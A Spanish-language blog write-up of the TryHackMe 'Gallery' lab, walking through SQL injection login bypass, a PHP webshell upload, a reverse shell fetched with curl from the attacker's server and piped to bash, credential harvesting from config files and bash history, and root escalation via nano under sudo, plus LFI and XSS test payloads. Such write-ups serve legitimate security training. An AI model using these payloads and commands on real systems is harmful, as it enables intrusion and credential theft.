---
layout: single
title: Gallery - TryHackMe
excerpt: "Mediante la vulnerabilidad web conocida como SQLI, nos saltaremos la autenticación de un Login y ingresaremos a la cuenta de *Administrator*. Ahí, veremos un apartado para subir fotos a una album, que mediante Fuzzing descubriremos la ruta de donde se aloja. Subiremos una webshell en .php, ya que no valida los tipos de archivos que se suben ganando una ejecución remota de comandos (RCE). Para ganar privilegios abusaremos de nuestros permisos de sudo con *nano*. Tendremos que encontrar antes la contraseña del usuario para listar."
date: 2026-01-23
classes: wide
header:
  teaser: /assets/images/thm-writeup-gallery/logo_gal.png
  teaser_home_page: true
  icon: /assets/images/tryhackme.webp
categories:
  - TryHackMe
  - Pentesting
tags:
  - writeup
  - eJPTv2
  - HackingWeb
  - SQLI
  - BypassAuth
  - CVE-2023-27040
  - FileUpload
  - RemoteAccessRCE
  - WebShell
  - ReverseShell
  - MariaDB
  - InformationLekeage
  - EscaladaPrivilegios
  - Sudo
---

![](/assets/images/thm-writeup-gallery/logo_gal.png)

"Mediante la vulnerabilidad web conocida como SQLI, nos saltaremos la autenticación de un Login y ingresaremos a la cuenta de <span style="color:blue">Administrator</span>. Ahí, veremos un apartado para subir fotos a una album, que mediante Fuzzing descubriremos la ruta de donde se aloja. Subiremos una webshell en .php, ya que no valida los tipos de archivos que se suben ganando una ejecución remota de comandos (RCE). Para ganar privilegios abusaremos de nuestros permisos de sudo con "nano". Tendremos que encontrar antes la contraseña del usuario para listar."

## WRITE UP
IP VÍCITMA-> 10.67.170.17  (TTL 63) LINUX


#### RECONOCIMIENTO

Lo primero que vamos hacer es crear nuestro entorno de trabajo: <span style="color:lightblue">Gallery</span>

Dentro usaremos la herramienta de s4vitar *mkt* cual nos generara las carpetas necesarias para tener todo más organizado; **Nmap...**

>**which** mkt.py | **xargs** **batcat** -l python

*Ver en que ubicación está una herramienta y ver su código*
*Adelante explicamos a tener batcat, que es un cat pero con esteroides*


Para empezar el reconocimiento, enviamos una traza ICMP a la <span style="color:red">IP</span> de la maquina víctima, para comprobar que tenemos conectividad, tenemos dos alternativas:

-Usar el script *whichSystem* que nos dirá directamente el equipo al que estamos atacando, por ende habrá tenido ping para dar la respuesta. Es más silencioso que nmap.

![](/assets/images/thm-writeup-gallery/whichsystem_gal.png)


-Usar el comando *ping* <span style="color:red">10.67.170.17</span> <span style="color:yellow">-c</span> 1  <span style="color:yellow">-R</span>
*-R Lo que hace es un record route que consiste que a la hora de hacer la petición se lo envía a un nodo intermediario para que no sea directa la petición*

![](/assets/images/thm-writeup-gallery/conectividad_gal.png)



Después de confirmar que tenemos conectividad, usaremos **nmap** para a ver que puertos tenemos abiertos y que protocolos/servicios tenemos.


**nmap** <span style="color:yellow">-p- --open -Pn -vvv -n -sS --min-rate 5000</span> <span style="color:red">10.67.170.17</span> <span style="color:yellow">-oG</span> <span style="color:pink">allPorts</span>
*Veremos porque el formato grapeable, es importante.*

![](/assets/images/thm-writeup-gallery/nmap1_gal.png)


Una vez hecho, usaremos otra herramienta de s4vitar *extractports* al archivo allPorts
cual nos copiara los puertos, y escanearlos con nmap. 

![](/assets/images/thm-writeup-gallery/extractport_gal.png)


**nmap** <span style="color:yellow">-sVC</span>  <span style="color:yellow">-p</span><span style="color:purple">22,80,8080</span> <span style="color:red">10.67.170.17</span> <span style="color:yellow">-oN</span> <span style="color:pink">targeted</span> 
*Este formato lo emplearemos con batcat lenguaje java para verlo mejor*
*Nos mostrará la versión de los servicios que están corriendo*
*Usará scripts defaults*

![](/assets/images/thm-writeup-gallery/nmap2_gal.png)


Una vez escaneado, usaremos batcat:
>https://github.com/sharkdp/bat.git

**batcat** <span style="color:pink">target</span> <span style="color:yellow">-l</span> <span style="color:orange">java</span>
*nos mostrara la salida en un formato más bonito, con java

![](/assets/images/thm-writeup-gallery/batcat_gal.png)

**El httponly esta desactivado, eso quiere decir que podemos manipular cookies.

#### ANÁLISIS SSH: RECONOCIMIENTO

Con *searchsploit* buscaremos si la versión del **SSH** es vulnerable pero como es común encontrarse con esta versión, nunca es.

**searchsploit** <span style="color:yellow">openssh 8.2p1</span>

![](/assets/images/thm-writeup-gallery/searchespssh_gal.png)


#### ANÁLISIS WEB: RECONOCIMIENTO

Haremos un *whatweb* a la página web por el puerto <span style="color:purple">8080</span>, para conocer tecnologías, lenguaje... Ya que el otro puerto es el Default de Apache. Es lo mismo que la extensión <span style="color:lightyellow">Wappalyzer</span> pero por consola.

**whatweb** http://10.67.170.17:8080/

![](/assets/images/thm-writeup-gallery/whatweb_gal.png)

Hay un formulario y el lenguaje es **PHP**. | 


Entramos al a Página:
Nos saldrá un Login cual de momento no tenemos credenciales.

![](/assets/images/thm-writeup-gallery/log_gal.png)


Se trata del <span style="color:yellow">CMS</span> "**Simple Image**". Buscamos en google:

Herramienta para diseños web cual permite visualizar imágenes de forma profesional.

![](/assets/images/thm-writeup-gallery/simpleimgall_gal.png)


##### POSIBLES EXPLOTACIONES A NIVEL WEB
###### SQLI

>Una inyección *SQL* **(Structured Query Language)** es un tipo de ataque en el que se intenta explotar vulnerabilidades en el código de una aplicación insertando una consulta SQL en campos de entrada o formulario regulares, como un nombre de usuario o contraseña.


Podemos ver ejemplos de SQLI básicos en **formularios** de Bases de datos, algunos métodos comunes:

- Introduciendo como usuario `name'#`  o `' OR '1'='1` o `' OR 1=1-- -` o `name' or '1'='1'#` -> el símbolo `#` hace que el resto de la consulta, incluyendo la verificación de la contraseña, quede comentado, por lo que no se comprueba la contraseña (Ponemos la que sea).

- Introduciendo en la contraseña `' OR '1'='1` -> esta condición siempre es verdadera, lo que hace que el sistema acepte el acceso sin validar la contraseña real.

Aunque muchas más variaciones estas son las más típicas.


#### BUSCAR CREDENCIALES POTENCIALES

Como carecemos de algún nombre o contraseña vamos a mirar por el código fuente, a ver si vemos algo. "**CTRL + U**"

Filtramos por "admin" y nos llevara a un css que usa una página de plantillas para administración.

![](/assets/images/thm-writeup-gallery/plantadmin_gal.png)

![](/assets/images/thm-writeup-gallery/platnadmin2_gal.png)


Teniendo esto, no nos da un nombre pero como es para administración, podríamos probar con cosas parecidas a <span style="color:blue">admin</span> o <span style="color:blue">administrator</span>...

![](/assets/images/thm-writeup-gallery/adminlte_gal.png)

#### SQLI

ALGUNOS PAYLOADS EXITOSOS:

1) admin`' OR '1'='1' -- -` (cualquier contraseña)

![](/assets/images/thm-writeup-gallery/sql1_gal.png)


2) admin`'#` (cualquier contraseña)

![](/assets/images/thm-writeup-gallery/sql2_gal.png)


Accederemos como <span style="color:blue">Administrator</span> al panel del CMS, porque se ha acontecido la vulnerabilidad SQLI.

![](/assets/images/thm-writeup-gallery/adminpan_gal.png)


En el código fuente vemos una ruta cual se refiere al alojamiento de archivos. -> <span style="color:lightblue">/uploads/</span>

![](/assets/images/thm-writeup-gallery/uplf_gal.png)


Si nos metemos, nos sale un <span style="color:lightblue">/user_1/</span>.

![](/assets/images/thm-writeup-gallery/user_gal.png)


Si recordamos en la página del admin, salía un apartado de "Albums". Cual lo más probable es que corresponda con esta ruta.

![](/assets/images/thm-writeup-gallery/almuser_gal.png)


##### SEARCHSPLOIT

Si hubiésemos usado *searchsploit* para buscar "<span style="color:yellow">Simple Image Gallery</span>", nos hubiese salido las vulnerabilidades que tiene por versión.

En este caso si nos fijamos en el panel a abajo izquierda, tiene la <span style="color:yellow">v1.0</span> cual permite *SQLI* y *ejecución remota de comandos* (**Remote Code Execution**)

**searchsploit** <span style="color:yellow">Simple Image Gallery</span>

![](/assets/images/thm-writeup-gallery/searchespcms_gal.png)


Vamos a mirar el código:

**searchsploit** <span style="color:yellow">openssh 8.2p1</span> <span style="color:green">-x</span>  php/webapps/<span style="color:lime">50214.py</span>

![](/assets/images/thm-writeup-gallery/miraresp_gal.png)


Ha usado el mismo método que nosotros para bypassear la autenticación del Login.

![](/assets/images/thm-writeup-gallery/codesp_gal.png)


Para ejecutar comandos vemos que sube una webshell, que se basa sobre el parámetro page=user, para ejecutar código. Esta vulnerabilidad es **CVE-2023-27040**.


![](/assets/images/thm-writeup-gallery/vercode2_gal.png)


Pero nosotros los vamos hacer por otro lado. Nos vamos al apartado "Albums":
Donde se aloja una serie de fotos por álbumes.

![](/assets/images/thm-writeup-gallery/apartwe_gal.png)


#### FUZZING: DESCUBRIMIENTO DIRECTORIOS NIVEL WEB

Haremos Fuzzing con *ffuf* para saber en que directorio web se alojan estas fotos.

**ffuf** <span style="color:green">-c  -t</span>  200  <span style="color:green">-w</span>  <span style="color:lightblue">/usr/share/wordlists/SecLists/Discovery/Web-Content/</span>big.txt <span style="color:green">-u</span>  http://10.65.178.201/gallery/FUZZ/ <span style="color:green">-fc</span> 404 <span style="color:green">-mc </span> 200,302,403,401

Entre estas, destaca <span style="color:lightblue">/uploads/</span> que es el directorio donde habíamos visto previamente, y estos álbumes alojados en <span style="color:lightblue">/user_1/</span>  con sus respectivas fotos.

![](/assets/images/thm-writeup-gallery/fuzzing_gal.png)


![](/assets/images/thm-writeup-gallery/albumes_gal.png)


Nos metemos en "<span style="color:lightblue">/Album_2/</span>" y nos saldrá una serie de fotos, nos metemos en alguna.

![](/assets/images/thm-writeup-gallery/comp1_gal.png)


#### FILE UPLOAD: WEBSHELL

Como podemos ver la foto de "**album_2**" que corresponde con la de "**Sample Images**".
Encima al tener privilegios a nivel web podemos subir archivos.

Vamos a ver si nos valida al extensión <span style="color:grey">.php</span> .

![](/assets/images/thm-writeup-gallery/comp2_gal.png)


Crearemos una <span style="color:lime">webshell</span> para poder ejecutar comandos en caso de que funcione, por el parámetro ?**cmd**<span style="color:orange">=</span> . Jugaremos con etiquetas preformateadas para verlo mejor.

![](/assets/images/thm-writeup-gallery/webshell_gal.png)


Le damos a "**Upload**":

![](/assets/images/thm-writeup-gallery/uplo_gal.png)


Filtramos por todos los archivos y aceptamos.

![](/assets/images/thm-writeup-gallery/selcmd_gal.png)


Subiéndose exitosamente la <span style="color:lime">webshell</span>.

![](/assets/images/thm-writeup-gallery/succs_gal.png)

###### EJECUCIÓN WEBSHELL: RCE

Para ejecutarla, nos iremos a la ruta del album_2, y como tienen una **id** asignada cada archivo, veremos la de la *webshell* y seguiremos esta sintaxis en la URL:

<span style="color:lime">1769202660.php</span>?**cmd**<span style="color:orange">=</span>

![](/assets/images/thm-writeup-gallery/contental_gal.png)


 Después del "=" pondremos el comando a ejecutar cual se interpretara. En este caso probaremos con **id**.

Nos dará salida teniendo una ejecución de comandos exitosa.

![](/assets/images/thm-writeup-gallery/rce_gal.png)


#### CONFIGURACIÓN NETCAT: REVERSHELL

Ahora nos daremos una <span style="color:lime">Reverseshell</span>.

Lo primero será configurar nuestro *netcat* para recibir el host para victima para cuando enviemos la revershell, nos pondremos en escucha por el puerto <span style="color:purple">443</span>.

**nc** <span style="color:yellow">-nvlp</span> <span style="color:purple">443</span> 

![](/assets/images/thm-writeup-gallery/nc_gal.png)


#### CONFIGURACIÓN REVERSHELL

Meteremos la línea de <span style="color:lime">revershell</span> en un archivo **.sh** para ejecutarlo en bash como script.
Apuntara a nuestra IP atacante y al puerto en escucha que pusimos.

**echo** ``'bash -i >& /dev/tcp/IPatacante/PUERTOatacante 0>&1'``

![](/assets/images/thm-writeup-gallery/confbas_gal.png)


#### CONFIGURACIÓN SERVIDOR HTTP

Nos abrimos un **servidor http con python3** para que ejecutar un comando que se descargue el la shell.sh y ejecutarla.

**Python3** <span style="color:yellow">-m</span> *http.server* <span style="color:purple">8000</span>

![](/assets/images/thm-writeup-gallery/pyser_gal.png)


#### EJECUTAR REVERSHELL

Ahora nos vamos a la página y ejecutaremos la rever shell de la siguiente forma:

Con **curl** nos descargaremos de nuestro servidor http el script **shell.sh** que esta abierto en esa ruta de donde se aloja. y al final lo concatenaremos un una tubería para que de forma paralela se ejecute en bash.

<span style="color:lime">1769202660.php</span>?**cmd**<span style="color:orange">=</span>curl<span style="color:orange">%20</span>http://192.168.158.89:8000/shell.sh|bash

![](/assets/images/thm-writeup-gallery/ejecrevs_gal.png)

>%20 = espacio en la URL


Recibiremos en nuestro **netcat** la conexión de nuestra víctima.
Estaremos como <span style="color:blue">www-data</span>.

![](/assets/images/thm-writeup-gallery/revshellhos_gal.png)


#### SHELL INTERACTIVA | TRATAMIENTO STTY

1) **script** <span style="color:lightblue">/dev/null</span> <span style="color:green">-c</span> bash

![](/assets/images/thm-writeup-gallery/tt1_gal.png)

2) **CTRL + Z**

![](/assets/images/thm-writeup-gallery/tty2_gal.png)

3) **stty** <span style="color:yellow">raw</span> <span style="color:green">-echo</span><span style="color:orange">;</span> <span style="color:yellow">fg</span>
4) **reset** <span style="color:orange">xterm</span>

![](/assets/images/thm-writeup-gallery/ty3_gal.png)

5) Esperamos, y **export** <span style="color:orange">TERM=xterm</span>

![](/assets/images/thm-writeup-gallery/tty4_gal.png)

Y ya tendremos una shell interactiva.

![](/assets/images/thm-writeup-gallery/tty5_gal.png)


#### BUSCA CREDENCIALES

Nos iremos a la siguiente ruta <span style="color:lightblue">/var/www/html/gallery</span> cual listaremos "**ls**", haber que se aloja allí.

![](/assets/images/thm-writeup-gallery/listarch_gal.png)

Leeremos **initialize.php**, cual va a contener unas credenciales de una base de datos para su acceso.

credenciales: <span style="color:blue">gallery_user</span>:<span style="color:darkred">passw0rd321</span>

![](/assets/images/thm-writeup-gallery/lekeage_gal.png)


Para saber de que Base de datos se trata, miraremos los puertos corriendo en local.
Se trata del <span style="color:purple">3306</span> cual es un *MariaDB*.

**ss** <span style="color:yellow">-tulnp</span>

![](/assets/images/thm-writeup-gallery/listpuert_gal.png)


#### ACCESO A MariaDB: HASH ADMINISTRATOR

1) **mysql** <span style="color:yellow">-u</span> <span style="color:blue">root</span>  <span style="color:yellow">-h</span>  <span style="color:red">10.65.178.201</span> / error

![](/assets/images/thm-writeup-gallery/error1_gal.png)


2) **mysql** <span style="color:yellow">-u</span> <span style="color:blue">root</span>  <span style="color:yellow">-p</span>  /  Usuarios por defecto: "root" or "localhost" tienen acceso denegado a la base de datos.

![](/assets/images/thm-writeup-gallery/error2_gal.png)


3) **mysql** <span style="color:yellow">-u</span> <span style="color:blue">gallery_user</span>  <span style="color:yellow">-p</span>  / Entramos con las credenciales encontrados.

credenciales: <span style="color:blue">gallery_user</span>:<span style="color:darkred">passw0rd321</span>

![](/assets/images/thm-writeup-gallery/acces_gal.png)


###### COMANDOS
Para mostrar las bases de datos disponibles: <span style="color:lightyellow">show</span> **databases**<span style="color:orange">;</span>

Nos interesa la base de datos <span style="color:gold">gallery_db</span>.

![](/assets/images/thm-writeup-gallery/basedatos_gal.png)


Para usar dicha db: <span style="color:lightyellow">use</span> **gallery_db**<span style="color:orange">;</span>

![](/assets/images/thm-writeup-gallery/usarbd_gal.png)


Para mostrar la información de dicha db, filtraremos sus tablas: <span style="color:lightyellow">show</span> **tables**<span style="color:orange">;</span>

![](/assets/images/thm-writeup-gallery/tablas_gal.png)


Para seleccionar la tabla:
<span style="color:lightyellow">SELECT * FROM</span> **users**<span style="color:orange">;</span>
Nos lista al usuario administrador con su hash. (No es relevante romperlo, lo podemos ignorar) 

![](/assets/images/thm-writeup-gallery/hashadmin_gal.png)


Para salir usamos: 
<span style="color:lightyellow">exit</span>

![](/assets/images/thm-writeup-gallery/salir_gal.png)


#### LISTAR USUARIOS DEL SISTEMA

Leeremos el fichero <span style="color:lightblue">/etc/</span><span style="color:grey">passwd</span> para ver que ususarios tienen bash y a cual podríamos acceder.

**cat**  <span style="color:lightblue">/etc/</span><span style="color:grey">passwd</span> | **grep** sh<span style="color:orange">$</span>

![](/assets/images/thm-writeup-gallery/usuariosbash_gal.png)


(Los otros dos usuarios no serán importantes) En el home de <span style="color:blue">mike</span>, tendrá la flag de usuario pero no tendremos permisos para interactuar con nada. Nos toca buscar sus credenciales

![](/assets/images/thm-writeup-gallery/accesdenie_gal.png)


#### CREDENCIALES  DEL USER MIKE

En el directorio <span style="color:lightblue">/var/backups/</span>, veremos un directorio llamado <span style="color:lightblue">mike_home_backup</span>, nos metemos.

![](/assets/images/thm-writeup-gallery/backuphome_gal.png)


Contendrá como su nombre indica un **backup** de su home, que es lo que hemos visto antes.
En el directorio <span style="color:lightblue">documents</span> habrá una nota con sus cuentas personales, que no son relevantes.

![](/assets/images/thm-writeup-gallery/personac_gal.png)


Vamos a leer su historial del bash, haber que comandos puso en su sesión.
Vemos una contraseña -> <span style="color:darkred">b3stpassw0rdbr0xx</span>

![](/assets/images/thm-writeup-gallery/contraselek_gal.png)


Probamos las credenciales y son correctas.

**su** <span style="color:blue">mike</span>:<span style="color:darkred">b3stpassw0rdbr0xx</span>

![](/assets/images/thm-writeup-gallery/convu_gal.png)


#### ACCESO SSH Y BANDERA USER

Como tenemos las credenciales de mike, y el servicio *ssh* abierto, vamos a loguearnos en dicho servicio.

**ssh** <span style="color:blue">mike</span><span style="color:lime">@10.65.178.201</span> 

![](/assets/images/thm-writeup-gallery/logssh_gal.png)


(opcional)

![](/assets/images/thm-writeup-gallery/export_gal.png)


En el <span style="color:lightblue">/home/mike</span> leemos la bandera de usuario.

![](/assets/images/thm-writeup-gallery/flaguser_gal.png)


#### ESCALADA DE PRIVILEGIOS
###### PERMISOS SUDO: (script) ROOTKIT.SH

Listamos nuestros permisos de *sudo* disponibles como usuario para ver si tenemos algún privilegio de cual aprovecharnos.

**sudo -l**

Nos lista uno que no pide contraseña y que es de root. Podemos usar **bash** como <span style="color:blue">root</span> para el ejecutar el script en bash "<span style="color:lime">rootkit.sh</span>" en el directorio <span style="color:lightblue">/opt/</span>.

![](/assets/images/thm-writeup-gallery/listsudo_gal.png)


Nos metemos a la ruta y vemos que el script pertenece al usuario y grupo de <span style="color:blue">root</span>.

![](/assets/images/thm-writeup-gallery/dueno_gal.png)


Vamos a leer que contiene:

**cat** <span style="color:lime">rootkit.sh</span>

![](/assets/images/thm-writeup-gallery/instruccscrip_gal.png)

>**Para administrar la herramienta de seguridad rkhunter**, permitiendo al usuario **elegir qué acción ejecutar** desde la terminal: comprobar la versión instalada (_versioncheck_), **actualizar la base de datos** (_update_), **listar configuraciones o datos** (_list_) o **leer el reporte generado** (_read_), todo mediante un menú simple que ejecuta el comando correspondiente según la opción ingresada


Para ejecutar el script: **sudo** <span style="color:lightblue">/bin/</span><span style="color:grey">bash</span> <span style="color:lightblue">/opt/</span><span style="color:lime">rootkit.sh</span>  | Escogeremos la opción "**read**" ya que usa el editor nano sobre un fichero y puede ser una vía potencial para escalar privilegios.

![](/assets/images/thm-writeup-gallery/readopt_gal.png)


###### SHELL ROOT: NANO

Nos ayudaremos del repositorio online: [GTF Obins](https://gtfobins.org/)

Nos dice los pasos a ejecutar cuando estemos dentro de un fichero y así convertirnos en usuario privilegiado.

<iframe src="https://gtfobins.org/gtfobins/nano/" allow="fullscreen" allowfullscreen="" style="height: 100%; width: 100%; aspect-ratio: 4 / 3;"></iframe>



1) Apretamos "**CTRL + R**"  y  "**CTRL + X**"

2) Seguidamente: **reset; sh 1>&0 2>&0**

![](/assets/images/thm-writeup-gallery/privesc1_gal.png)


Nos dará la opción de ejecutar código y para confirmar que somos <span style="color:blue">root</span>, pondremos "**id**". 
Exitosamente hemos escalado privilegios.

![](/assets/images/thm-writeup-gallery/privesc_gal.png)


Para darnos la shell completa:

**bash  -p**

![](/assets/images/thm-writeup-gallery/bashroot_gal.png)


#### BANDERA ROOT

Para coger la bandera de <span style="color:blue">root</span> a su home <span style="color:lightblue">/root/</span> y la leeremos. "**cat**"

![](/assets/images/thm-writeup-gallery/flagroot_gal.png)




##### COSAS EXTRAS
###### POSIBLE LFI

En la página podríamos haber probado en los parámetros cosas de este estilo para ver si carga elementos externos nivel local, en caso de estar mal sanitizado, pro no funcionan. 

page=

![](/assets/images/thm-writeup-gallery/lfi1_gal.png)


page=../../../../etc/passwd

![](/assets/images/thm-writeup-gallery/lfi2_gal.png)

Por si tiene alguna restricción y borra las barras, no borren la segunda:
page=..//..//..//..//etc//passwd

![](/assets/images/thm-writeup-gallery/lfi3_gal.png)


###### XSS (CROSS SITE-SCRIPTING)

Si nos vamos a las cookies de sesión desde la **DEV TOOLS** vemos que esta en **FALSE**:

-*httpOnly* (significa que una cookie es accesible desde el lado del cliente, permitiendo que scripts como **JavaScript** lean o manipulen su contenido)

-*Secure* (la cookie viaja por http)

![](/assets/images/thm-writeup-gallery/xss1_gal.png)


Le damos a añadir nuevo "albúm" y ponemos de nombre un simple script para probar si se refleja el xss:

``<script>alert(1)</script>``

![](/assets/images/thm-writeup-gallery/xss2_gal.png)

Se refleja, aunque no quiere decir que sea peligroso. Aunque para esta máquina no es necesario tocar nada esto, se podría intentar un *robo de cookies* **(Cookie Hijacking)** aunque es inútil.

![](/assets/images/thm-writeup-gallery/xss3_gal.png)

Si le damos al albúm nos refleja nuevamente.

![](/assets/images/thm-writeup-gallery/xssb4_gal.png)
